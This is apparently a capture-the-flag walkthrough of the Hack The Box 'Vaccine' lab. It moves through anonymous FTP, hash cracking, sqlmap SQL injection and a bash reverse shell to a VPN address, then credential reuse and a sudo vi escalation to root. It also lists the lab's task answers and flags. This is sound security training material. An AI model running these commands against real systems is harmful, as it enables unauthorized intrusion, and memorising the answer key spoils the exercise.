# HTB Vaccine - Complete Notes

## Machine Info
- **Name:** Vaccine
- **Difficulty:** Very Easy
- **OS:** Linux
- **Target IP:** 10.129.142.12
- **Your VPN IP:** 10.10.15.173

---

## 1. Enumeration (Nmap)

```bash
sudo nmap -sC -sV 10.129.142.12
```

**Open Ports:**
| Port | Service | Version |
|------|---------|---------|
| 21   | FTP     | vsftpd 3.0.3 |
| 22   | SSH     | OpenSSH 8.0p1 |
| 80   | HTTP    | Apache 2.4.41 |

**Key Findings:**
- FTP allows **anonymous login**
- File found: `backup.zip`

---

## 2. FTP Enumeration

```bash
ftp 10.129.142.12
# Login: anonymous
# Password: (any password works)

ftp> ls
# Found: backup.zip

ftp> get backup.zip
ftp> bye
```

---

## 3. Cracking backup.zip

```bash
# Extract hash from zip
zip2john backup.zip > hashes

# Crack with John
john --wordlist=/usr/share/wordlists/rockyou.txt hashes

# Show cracked password
john --show hashes
```

**Result:** `backup.zip:741852963`

```bash
# Extract files
unzip backup.zip
# Password: 741852963
```

**Extracted files:** `index.php`, `style.css`

---

## 4. Finding Web Credentials

```bash
cat index.php
```

**Found in index.php:**
```php
if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3")
```

**Hash:** `2cb42f8734ea607eefed3b70af13bbd3` (MD5)

```bash
# Crack with hashcat
echo "2cb42f8734ea607eefed3b70af13bbd3" > hash
hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt
```

**Result:** `qwerty789`

**Web Login:**
- URL: http://10.129.142.12
- Username: `admin`
- Password: `qwerty789`

---

## 5. SQL Injection (sqlmap)

**Target:** `dashboard.php?search=` parameter

```bash
sqlmap -u 'http://10.129.142.12/dashboard.php?search=any+query' \
       --cookie="PHPSESSID=8oobnkhsuahqa75ouet4hb4lju"
```

**Injection Types Found:**
- Stacked queries (PostgreSQL > 8.1)
- UNION query (5 columns)

**Get OS Shell:**
```bash
sqlmap -u 'http://10.129.142.12/dashboard.php?search=any+query' \
       --cookie="PHPSESSID=8oobnkhsuahqa75ouet4hb4lju" \
       --os-shell
```

---

## 6. Getting Reverse Shell

### IMPORTANT: Common Mistakes to Avoid

| Mistake | Correct |
|---------|---------|
| Using target IP in reverse shell | Use YOUR VPN IP (10.10.15.173) |
| Pressing Enter for default (Y) at output prompt | Answer **n** |
| Not having listener running first | Start `nc` BEFORE executing shell |

### Step-by-Step

**Terminal 1 - Start Listener:**
```bash
sudo nc -lvnp 443
```

**Terminal 2 - In sqlmap os-shell:**
```bash
# Write reverse shell to file
echo 'bash -i >& /dev/tcp/10.10.15.173/443 0>&1' > /tmp/rev.sh

# Execute it
bash /tmp/rev.sh
```

When prompted: `do you want to retrieve the command standard output? [Y/n/a]`
→ Type **n** and press Enter

**Result:**
```
connect to [10.10.15.173] from (UNKNOWN) [10.129.142.12] 33634
postgres@vaccine:/var/lib/postgresql/11/main$
```

---

## 7. Post-Exploitation (User Shell)

**Upgrade to fully interactive shell:**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z
```

**Local machine:**
```bash
stty raw -echo; fg
```

**Back in shell:**
```bash
export TERM=xterm
```

**Find user flag:**
```bash
cat ~/user.txt
# ec9b13ca4d6229cd5cc1e09980965bf7
```

**Find database password in web files:**
```bash
cat /var/www/html/dashboard.php | grep password
# password=P@s5w0rd!
```

---

## 8. SSH Access (More Stable)

```bash
ssh postgres@10.129.142.12
# Password: P@s5w0rd!
```

---

## 9. Privilege Escalation

**Check sudo privileges:**
```bash
sudo -l
# Password: P@s5w0rd!
```

**Result:**
```
User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

**Exploit via vi (GTFOBins):**
```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

**Inside vi:**
```vim
:set shell=/bin/sh
:shell
```

**Verify root:**
```bash
whoami
# root
id
# uid=0(root) gid=0(root) groups=0(root)
```

**Get root flag:**
```bash
cd /root
cat root.txt
# dd6e058e814260bc70e9bbdef2715849
```

---

## 10. HTB Task Answers

| Task | Answer |
|------|--------|
| Task 1: Service besides SSH/HTTP | **FTP** |
| Task 2: Username for any password | **anonymous** |
| Task 3: File downloaded | **backup.zip** |
| Task 4: John script for zip hashes | **zip2john** |
| Task 5: Admin password | **qwerty789** |
| Task 6: sqlmap option for command exec | **--os-shell** |
| Task 7: Program via sudo | **vi** (or `/bin/vi`) |

---

## 11. Flags

| Flag | Value |
|------|-------|
| User Flag | `ec9b13ca4d6229cd5cc1e09980965bf7` |
| Root Flag | `dd6e058e814260bc70e9bbdef2715849` |

---

## Key Lessons Learned

1. **Always check for anonymous FTP** - often contains valuable files
2. **Password cracking is essential** - John/Hashcat for zip files and hashes
3. **Source code review** - web files contain credentials
4. **SQLmap os-shell** - powerful but requires proper reverse shell technique
5. **Use YOUR IP in reverse shells** - not the target's IP
6. **Answer 'n' to sqlmap output prompts** - prevents breaking the connection
7. **SSH for stability** - much better than reverse shells for privilege escalation
8. **GTFOBins** - essential resource for sudo privilege escalation via editors

---

## Tools Used

- nmap
- ftp
- zip2john / john
- hashcat
- sqlmap
- nc (netcat)
- ssh
- vi (for privilege escalation)
